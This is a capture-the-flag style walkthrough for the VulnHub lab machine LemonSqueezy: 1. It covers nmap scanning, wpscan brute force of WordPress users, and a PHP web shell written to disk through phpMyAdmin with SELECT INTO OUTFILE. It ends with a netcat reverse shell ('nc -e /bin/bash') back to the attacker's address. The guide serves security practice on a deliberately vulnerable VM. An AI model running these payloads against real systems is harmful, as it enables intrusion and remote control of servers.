:::::::::::::::::::::::: page
# LemonSqueezy: 1 {#lemonsqueezy-1 .title}

\

## 

## LemonSqueezy: 1

- **[LemonSqueezy: 1]{style="color:#8ff0a4;"}** :-

<!-- -->

- Download the machine :
  <https://www.vulnhub.com/entry/lemonsqueezy-1,473/>

![](images/803-1.png)

- [Machine Setup]{style="color:#33d17a;"} :

1.  Now extract the file and fix permissions :

::: codebox
    7z x LemonSqueezy.7z
:::

![](images/803-2.png)

1.  Make a new machine in virtual box .

![](images/803-3.png) Click to finish .

1.  Now go to machine setting :

::: codebox
    VirtualBox ➜ LemonSqueezy ➜ Settings ➜ Storage
:::

- Remove empty section from controller IDE .
- Remove the SATA controller .
- Click add hard disk .

![](images/803-4.png)

![](images/803-5.png)

- After select the file the click to choose .
- Network is bridge adapter .

1.  Start the machine .

![](images/803-6.png)

1.  [Network Scanning]{style="color:#33d17a;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/803-7.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.226
:::

![](images/803-8.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.226
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.226 
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.226
:::

![](images/803-9.png)

1.  [Web Enumeration]{style="color:#33d17a;"} :

- IP visit in browser : <http://192.168.2.226>
  <http://192.168.2.226/wordpress/> <http://192.168.2.226/phpmyadmin/>
  <http://192.168.2.226/wordpress/wp-login.php>
  <http://192.168.2.226/manual/en/index.html>

<!-- -->

- Entry in host file :

::: codebox
    nano /etc/hosts
:::

![](images/803-10.png)

- Then visit the hostname : <http://lemonsqueezy/wordpress/>
  <http://lemonsqueezy/wordpress/wp-login.php>

<!-- -->

- Find wordpress username :

::: codebox
    wpscan --url http://lemonsqueezy/wordpress/ -e u
:::

![](images/803-11.png)

- Two user\'s found :

::: codebox
    lemon
    orange
:::

- Find wordpress password :

::: codebox
    wpscan --url http://lemonsqueezy/wordpress/ --usernames lemon --passwords /opt/rockyou.txt
:::

- 

::: codebox
    wpscan --url http://lemonsqueezy/wordpress/ --usernames orange --passwords /opt/rockyou.txt
:::

![](images/803-12.png)

- Now Login wordpress : <http://lemonsqueezy/wordpress/wp-login.php>

::: codebox
    Username : orange
    Password : ginger
:::

![](images/803-13.png)

1.  [Reverse Shell]{style="color:#33d17a;"} :

- After login wordpress the go to Posts :

![](images/803-14.png)

- Now login phpmyadmin :

::: codebox
    Username : orange
    Password : n0t1n@w0rdl1st!
:::

- <http://192.168.2.226/phpmyadmin/>

![](images/803-15.png)

- Go to wordpress then wp_users :

![](images/803-16.png) Found user and password hash .

- Change the password for the user lemon, Copy the hash for user orange,
  and paste it on user lemon :

![](images/803-17.png)

- Now Login wordpress with lemon username :
  <http://lemonsqueezy/wordpress/wp-login.php>

::: codebox
    Username : lemon
    Password : ginger
:::

![](images/803-18.png)

- Make a file :

::: codebox
    nano shell.php
:::

- Add content :

::: codebox
    <?php system($_GET['cmd']); ?>
:::

- After Login go to plugins :

::: codebox
    Plugins → Add New → Upload Plugin
:::

![](images/803-19.png)

![](images/803-20.png) Not upload the php file on server .

- Try to upload the file through the phpmyadmin .

<!-- -->

- Click to SQL and place the reverse shell payload :

::: codebox
    SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/wordpress/backdoor.php"
:::

![](images/803-21.png)

- Now call the backdoor.php with ?cmd=id command :
  <http://lemonsqueezy/wordpress/backdoor.php?cmd=id>

![](images/803-22.png)

- Start the listener :

::: codebox
    nc -nlvp 443
:::

- Inject nc in url :

::: codebox
    nc  -e /bin/bash 192.168.2.219 443
:::

- <http://lemonsqueezy/wordpress/backdoor.php?cmd=nc%20%20-e%20/bin/bash%20192.168.2.219%20443>

<!-- -->

- Get the shell :

![](images/803-23.png)
::::::::::::::::::::::::
